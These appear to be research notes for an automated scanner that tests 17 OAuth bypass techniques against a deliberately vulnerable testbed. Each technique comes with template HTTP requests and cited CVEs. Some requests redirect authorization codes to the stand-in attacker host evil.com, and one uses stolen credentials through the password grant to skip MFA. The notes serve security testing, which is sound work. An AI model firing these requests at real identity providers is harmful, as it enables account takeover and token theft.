# OAuth Attack Techniques — Research for Automated Tool

Target: BRuteLogic OAuth Authorization Bypass Testbed (403.brutelogic.net/authz/oauth)
Base: "Broken Token: OAuth" — 13 original + 4 variant techniques, 17 endpoints total.

---

## 1. Response Mode Escape
**Endpoint:** `/authz/oauth/response-mode`
**Root cause:** Server patches one `response_mode` but not another. The Keycloak three-CVE chain (CVE-2023-6134 → CVE-2023-6291 → CVE-2023-6927): XSS via `form_post` patched, attacker switches to `form_post.jwt` (JARM), same XSS fires.
**Find:** Send authorize request with each response_mode: `query`, `fragment`, `form_post`, `form_post.jwt`, `web_message`. Note which ones the server accepts vs rejects.
**Forge:** If `fragment` is blocked but `form_post` works (or vice versa), switch modes. The code/token lands in the alternate channel.
**Fire:** Authorization code appears in the non-default response_mode channel.
**HTTP:**
```
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&response_mode=fragment&scope=openid
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&response_mode=form_post&scope=openid
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&response_mode=web_message&scope=openid
```
**CVEs:** CVE-2023-6134, CVE-2023-6291, CVE-2023-6927

---

## 2. Missing State
**Endpoint:** `/authz/oauth/state?technique=missing`
**Root cause:** No `state` parameter in the authorization request = no CSRF protection. Attacker can craft an authorization URL and trick a victim into completing it — login CSRF / session fixation.
**Find:** Send authorize request without `state` parameter. If server issues a code without requiring state, vulnerable.
**Forge:** Craft authorize URL without state, get victim to visit it, code returns to redirect_uri without CSRF binding.
**Fire:** Authorization code issued without any state parameter.
**HTTP:**
```
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid
# No state param → if code is returned, CSRF is possible
```
**RFC:** RFC 6749 §10.12 (CSRF), RFC 9700 (state SHOULD be used)

---

## 3. Static State
**Endpoint:** `/authz/oauth/state?technique=static`
**Root cause:** State parameter is always the same value (hardcoded). No entropy = no CSRF protection. CVE-2023-31999 (Authentik).
**Find:** Initiate multiple flows, compare state values. If identical, vulnerable.
**Forge:** Same as missing — observe the static state once, replay it in a crafted auth URL.
**Fire:** Multiple requests return identical state values.
**HTTP:**
```
# Request 1:
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid&state=FIXED_VALUE
# Request 2:
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid&state=FIXED_VALUE
# Same state both times → vulnerable
```

---

## 4. Predictable State
**Endpoint:** `/authz/oauth/state?technique=predictable`
**Root cause:** State is generated from a weak source (timestamp, sequential counter, weak PRNG). Attacker can guess the next state.
**Find:** Collect multiple state values, look for patterns (incrementing, timestamp-based, low entropy).
**Forge:** Predict the next state value, pre-craft the callback URL.
**Fire:** Successfully predict and use a state value before the victim's flow completes.
**HTTP:**
```
# Collect states:
GET /authorize?... → state=abc001
GET /authorize?... → state=abc002
GET /authorize?... → state=abc003
# Pattern: sequential → next is abc004
```

---

## 5. S256→plain Downgrade
**Endpoint:** `/authz/oauth/pkce?technique=plain`
**Root cause:** Server evaluates `code_challenge_method` per-request, not locked at registration. Attacker intercepts the authorize request and changes method from `S256` to `plain`. Now code_challenge IS the verifier (no hash needed).
**Find:** Send authorize with `code_challenge_method=plain` instead of `S256`. If accepted, vulnerable.
**Forge:** Intercept/craft authorize request with `code_challenge_method=plain` and `code_challenge=KNOWN_VALUE`. At token endpoint, send `code_verifier=KNOWN_VALUE` (same string, since plain = identity function).
**Fire:** Token endpoint issues tokens with plain verifier matching the challenge.
**HTTP:**
```
# Authorize:
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid
  &code_challenge=my_known_verifier&code_challenge_method=plain
# Token:
POST /token
  grant_type=authorization_code&code=AUTH_CODE&redirect_uri=Y
  &client_id=X&code_verifier=my_known_verifier
```
**CVEs:** CVE-2023-48228, CVE-2024-23647 (authentik)

---

## 6. No Verifier Check
**Endpoint:** `/authz/oauth/pkce?technique=noverifier`
**Root cause:** Token endpoint doesn't validate `code_verifier` at all — omitting it still redeems the code. PKCE is cosmetic.
**Find:** Complete authorize with PKCE (S256 challenge), then exchange code WITHOUT sending `code_verifier`. If tokens are returned, vulnerable.
**Forge:** Steal the authorization code (via referrer leak, open redirect, etc.), exchange it at token endpoint without any verifier.
**Fire:** Token issued without code_verifier.
**HTTP:**
```
# Authorize with PKCE:
GET /authorize?...&code_challenge=SHA256_HASH&code_challenge_method=S256
# Token WITHOUT verifier:
POST /token
  grant_type=authorization_code&code=AUTH_CODE&redirect_uri=Y&client_id=X
# No code_verifier → if tokens returned, PKCE is not enforced
```

---

## 7. No Challenge Check
**Endpoint:** `/authz/oauth/pkce?technique=nochallenge`
**Root cause:** Authorization endpoint doesn't require `code_challenge`. PKCE is optional — attacker omits it entirely, gets an unbound code.
**Find:** Send authorize request WITHOUT `code_challenge` or `code_challenge_method`. If code is issued, vulnerable.
**Forge:** Initiate flow without PKCE params, intercept the code, exchange it at token endpoint (also without verifier).
**Fire:** Full OAuth flow completes with zero PKCE parameters.
**HTTP:**
```
# Authorize without PKCE:
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid
# No code_challenge, no code_challenge_method
# Token without verifier:
POST /token
  grant_type=authorization_code&code=AUTH_CODE&redirect_uri=Y&client_id=X
```

---

## 8. Confidential Client Downgrade
**Endpoint:** `/authz/oauth/pkce?technique=confidential`
**Root cause:** Server enforces PKCE only for public clients. Attacker adds `client_secret` to the request, posing as a confidential client, and PKCE requirement drops.
**Find:** Send token request with both `client_secret` (any/guessed value) and no `code_verifier`. If server accepts, it's treating the client as confidential and skipping PKCE.
**Forge:** Add a `client_secret` parameter to the token exchange. If the server doesn't strictly validate the secret against registration, PKCE is bypassed.
**Fire:** Code exchanged successfully with client_secret but without code_verifier.
**HTTP:**
```
# Authorize with PKCE:
GET /authorize?...&code_challenge=HASH&code_challenge_method=S256
# Token with secret, no verifier:
POST /token
  grant_type=authorization_code&code=AUTH_CODE&redirect_uri=Y
  &client_id=X&client_secret=anything
# If tokens returned → PKCE bypassed via confidential-client fallback
```

---

## 9. Missing aud Validation
**Endpoint:** `/authz/oauth/aud-validation`
**Root cause:** Token's `aud` (audience) claim not validated by the resource server. Token meant for service A is accepted by service B. Confused-deputy attack.
**Find:** Get a token from one client/resource, present it to a different resource server. If accepted, aud isn't checked.
**Forge:** Register or use a client at the same AS, get a token, replay it against the target resource.
**Fire:** Token accepted by a resource it wasn't issued for.
**HTTP:**
```
# Get token for client_A:
POST /token grant_type=authorization_code&code=CODE_A&client_id=client_A...
# Use token against resource meant for client_B:
GET /resource -H "Authorization: Bearer TOKEN_FROM_A"
# If 200 → aud not validated
```
**CVEs:** CVE-2026-50627 (Apache CXF), Descope nOAuth

---

## 10. OAuth Singleton Race Condition
**Endpoint:** `/authz/oauth/race`
**Root cause:** Authorization server stores OAuth state (PKCE verifiers, tokens, user identity) in a shared singleton. Concurrent auth flows from different users overwrite each other → identity swap.
**Find:** Fire two concurrent authorization flows with different users. Check if the returned identity matches the wrong user.
**Forge:** Time two concurrent requests to the token endpoint with different codes. If the server has a singleton state, one response may carry the other user's tokens.
**Fire:** User A gets User B's access token.
**HTTP:**
```
# Fire two concurrent token exchanges:
curl -X POST /token -d "code=CODE_USER_A&..." &
curl -X POST /token -d "code=CODE_USER_B&..." &
# Compare returned access tokens / user identities
```
**CVEs:** GHSA-9q5m-jfc4-wc92 (Tinyauth), GHSA-2cjm-2gwv-m892 (Parse Server)

---

## 11. prompt=none Silent Redirect
**Endpoint:** `/authz/oauth/prompt-none`
**Root cause:** `prompt=none` tells the AS to authenticate silently. If the user has a session, the AS redirects with a code/error to the redirect_uri without user interaction. If redirect_uri validation is weak, this is a silent open redirector.
**Find:** Send authorize with `prompt=none` and an attacker-controlled redirect_uri. If the server redirects (even with an error), it's an open redirector.
**Forge:** Craft `prompt=none` authorize URL pointing to attacker site. Victim clicks, silently redirected with potential code/error leak.
**Fire:** 302 redirect to attacker URI occurs without user seeing anything.
**HTTP:**
```
GET /authorize?client_id=X&redirect_uri=https://evil.com/cb
  &response_type=code&scope=openid&prompt=none
# If 302 to evil.com → silent redirect confirmed
```
**RFC:** RFC 9700 §4.11.2

---

## 12. DCR Open Registration
**Endpoint:** `/authz/oauth/register`
**Root cause:** Dynamic Client Registration (`/connect/register`) endpoint requires no authentication. Attacker registers a malicious client with controlled redirect_uri, logo_uri (SSRF), client_name (XSS).
**Find:** POST to `/register` or `/connect/register` with JSON body. If client_id returned without auth, open DCR confirmed.
**Forge:** Register a client with attacker-controlled `redirect_uris`, then use it to phish authorization codes. Or inject SSRF via `logo_uri`/`jwks_uri`.
**Fire:** New client_id + client_secret returned, usable in auth flows.
**HTTP:**
```
POST /register
Content-Type: application/json
{
  "redirect_uris": ["https://evil.com/cb"],
  "client_name": "Legit App",
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}
# If 201 with client_id → open registration
```
**CVEs:** CVE-2026-22752 (Spring)

---

## 13. Grant Type Substitution → MFA Bypass
**Endpoint:** `/authz/oauth/token/mfa`
**Root cause:** MFA is enforced only in the browser-based authorization_code flow. The password grant (`grant_type=password`) goes directly to the token endpoint, bypassing the browser and thus MFA.
**Find:** Check OpenID configuration for `grant_types_supported`. If `password` is listed, test direct token request with username/password.
**Forge:** POST to token endpoint with `grant_type=password` + stolen credentials. MFA never triggers.
**Fire:** Access token returned without MFA challenge.
**HTTP:**
```
# Check supported grants:
curl .well-known/openid-configuration | jq .grant_types_supported
# Direct password grant:
POST /token
  grant_type=password&username=victim@example.com&password=STOLEN
  &client_id=X&scope=openid
# If token returned → MFA bypassed
```
**CVEs:** CVE-2024-37893 (Firefly III)

---

## 14. Auth Method Confusion
**Endpoint:** `/authz/oauth/token/authmethod`
**Root cause:** Client registered with strong auth method (e.g., `private_key_jwt`), but server silently accepts weaker method (`client_secret_basic`, `client_secret_post`, or `none`). Attacker uses the weak method.
**Find:** Try authenticating at the token endpoint using different methods than what's registered. If a weaker method succeeds, vulnerable.
**Forge:** Use `client_secret_post` or `none` instead of the registered `private_key_jwt`.
**Fire:** Token issued with weaker auth method than registered.
**HTTP:**
```
# Registered: private_key_jwt
# Try client_secret_post:
POST /token
  grant_type=authorization_code&code=CODE&redirect_uri=Y
  &client_id=X&client_secret=leaked_or_guessed
# Try none:
POST /token
  grant_type=authorization_code&code=CODE&redirect_uri=Y
  &client_id=X
# If either works → auth method confusion
```
**References:** Spring Security #9780, MCP TypeScript SDK #951

---

## 15. Code Replay
**Endpoint:** `/authz/oauth/token/replay`
**Root cause:** Authorization code can be exchanged more than once. RFC 6749 §4.1.2 says codes MUST be single-use. If not, an attacker who captures a code via referrer/log can race the legitimate client.
**Find:** Exchange an authorization code, then try exchanging the same code again. If tokens returned both times, vulnerable.
**Forge:** Capture authorization code (via referrer leak, logs, MITM), exchange it after the legitimate client already did.
**Fire:** Same code yields tokens on second exchange.
**HTTP:**
```
# First exchange:
POST /token grant_type=authorization_code&code=AUTH_CODE&...
# → 200 OK, tokens returned
# Second exchange (same code):
POST /token grant_type=authorization_code&code=AUTH_CODE&...
# → If 200 OK again → code replay confirmed
# RFC 6749: server SHOULD revoke tokens from first exchange on second use
```

---

## 16. Scope Creep at Refresh
**Endpoint:** `/authz/oauth/token/scope`
**Root cause:** RFC 6749 §6 is silent on whether a refresh request can ask for broader scope than originally granted. If the server doesn't check, attacker escalates privileges.
**Find:** Get a refresh token with narrow scope (e.g., `read`). Refresh with broader scope (e.g., `read write admin`). If new token has wider scope, vulnerable.
**Forge:** Capture/steal a refresh token, request elevated scopes during refresh.
**Fire:** New access token contains scopes never originally granted.
**HTTP:**
```
# Original token: scope=read
# Refresh with wider scope:
POST /token
  grant_type=refresh_token&refresh_token=RT
  &client_id=X&scope=read write admin
# Decode new access token — if scope includes admin → scope creep
```
**CVEs:** CVE-2025-12110 (Keycloak), CVE-2026-1035

---

## 17. Resource Indicator Omission
**Endpoint:** `/authz/oauth/token/resource`
**Root cause:** Omitting the `resource` parameter (RFC 8707) from the token request → authorization server issues an audience-unbound token. Token works against any resource server at that AS.
**Find:** Request a token without the `resource` parameter. Check the token's `aud` claim — if it's missing, generic, or matches the AS itself, the token is unbound.
**Forge:** Get an unbound token, present it to any resource server at the same AS.
**Fire:** Token accepted by a resource server it wasn't intended for.
**HTTP:**
```
# Token request WITHOUT resource:
POST /token
  grant_type=authorization_code&code=CODE&redirect_uri=Y&client_id=X
# No &resource=https://api.example.com
# Decode token → check aud claim
# If aud missing or generic → audience-unbound token
```
**RFC:** RFC 8707, MCP spec mandates resource indicators

---

## Summary: FFF (Find, Forge, Fire) Pattern

Each technique follows: discover the weakness → craft the exploit → confirm the bypass.

The automated tool should:
1. **Discovery:** Fetch login page, extract client_id, redirect_uri, scopes, state. Check .well-known/openid-configuration.
2. **Per-technique test:** Hit each endpoint with the specific malicious request.
3. **Validation:** Check response for success indicators (200 OK, token returned, code issued, redirect to attacker URI).
4. **Report:** Flag each vulnerability found with evidence.
